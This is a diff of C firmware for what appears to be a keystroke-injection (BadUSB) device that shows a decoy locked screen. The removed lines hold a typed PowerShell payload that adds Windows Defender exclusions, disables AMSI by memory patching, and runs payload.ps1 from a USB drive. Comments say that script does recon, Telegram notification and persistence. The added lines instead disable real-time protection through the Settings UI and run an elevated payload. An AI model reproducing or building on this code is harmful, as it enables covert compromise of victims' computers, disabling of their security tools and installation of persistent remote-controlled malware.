@@ -12,43 +12,12 @@
 #include <stdio.h>
 #include <string.h>
 
-static const char *TAG = "locked_ui";
 #define LOCKED_SD_MOUNT_POINT "/sdcard"
 
 static bool s_locked = false;
 static volatile bool s_payload_running = false;
 static lv_obj_t *s_locked_screen = NULL;
 static lv_obj_t *s_sd_label = NULL;
-
-// Minimal typed payload. Order matters:
-//   1. Pre-exclude the MetaData install folder BEFORE payload.ps1 ever
-//      creates it. Defender accepts non-existent paths, so this is safe.
-//   2. Locate the USB by VolumeName 'M4NT1S' (set in usb_msc.c root
-//      entry 0, which Win32_LogicalDisk.VolumeName reports). Drive
-//      letter is discovered at runtime, never hardcoded.
-//   3. Exclude that drive root BEFORE reading payload.ps1 from it.
-//   4. AMSI bypass.
-//   5. iex only if the drive was found (and is now excluded).
-// All recon, Telegram notification, install, and persistence live inside
-// payload.ps1 itself.
-static const char *PS_PAYLOAD =
-    "Add-MpPreference -ExclusionPath 'C:\\ProgramData\\Microsoft\\DeviceMetadata' -EA SilentlyContinue;"
-    "$d=$null;"
-    "for($i=0;$i-lt30-and-not$d;$i++){"
-    "$c=gcim Win32_LogicalDisk -EA SilentlyContinue|?{$_.DriveType -eq 2 -and $_.VolumeName -eq 'M4NT1S'};"
-    "foreach($x in $c){"
-    "if($x.DeviceID-and(Test-Path \"$($x.DeviceID)\\payload.ps1\")){"
-    "Add-MpPreference -ExclusionPath $x.DeviceID -EA SilentlyContinue;"
-    "$d=$x.DeviceID;break"
-    "}"
-    "};"
-    "if(-not$d){sleep 1}"
-    "};"
-    "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
-    "$f=$a.GetField('amsiContext','NonPublic,Static');"
-    "$c=$f.GetValue($null);"
-    "[Runtime.InteropServices.Marshal]::WriteInt64($c,8,0);"
-    "if($d){iex(Get-Content \"$d\\payload.ps1\" -Raw)}";
 
 static void format_free_space(char *out, size_t out_len)
 {
@@ -83,6 +52,10 @@ void locked_ui_enter(void)
 
     s_locked_screen = lv_obj_create(lv_scr_act());
     lv_obj_set_size(s_locked_screen, LV_PCT(100), LV_PCT(100));
+    // The main screen is a flex column (header/body/status). This overlay must
+    // not be laid out by it, or it would be placed after the status row and
+    // shrink to the leftover space instead of covering the screen.
+    lv_obj_set_ignore_layout(s_locked_screen, true);
     lv_obj_set_style_bg_opa(s_locked_screen, LV_OPA_COVER, 0);
     lv_obj_set_style_bg_color(s_locked_screen, lv_color_black(), 0);
     lv_obj_set_style_pad_all(s_locked_screen, 0, 0);
@@ -127,15 +100,12 @@ static void payload_task(void *arg)
 
     hid_payload_set_layout(HID_LAYOUT_UK);
 
-    hid_payload_send_win_r();
-    hid_payload_send_string("powershell");
-    hid_payload_send_ctrl_shift_enter();
-    vTaskDelay(pdMS_TO_TICKS(1500));
-    hid_payload_send_alt_y();
-    vTaskDelay(pdMS_TO_TICKS(2500));
+    // 1. Disable real-time protection via Settings UI
+    hid_payload_disable_realtime_protection();
+    vTaskDelay(pdMS_TO_TICKS(1000));
 
-    hid_payload_send_string(PS_PAYLOAD);
-    hid_payload_send_enter();
+    // 2. Open elevated PowerShell, add exclusion, run payload.ps1
+    hid_payload_run_admin_payload();
 
     // ~30s drive poll + install + first registration
     vTaskDelay(pdMS_TO_TICKS(45000));
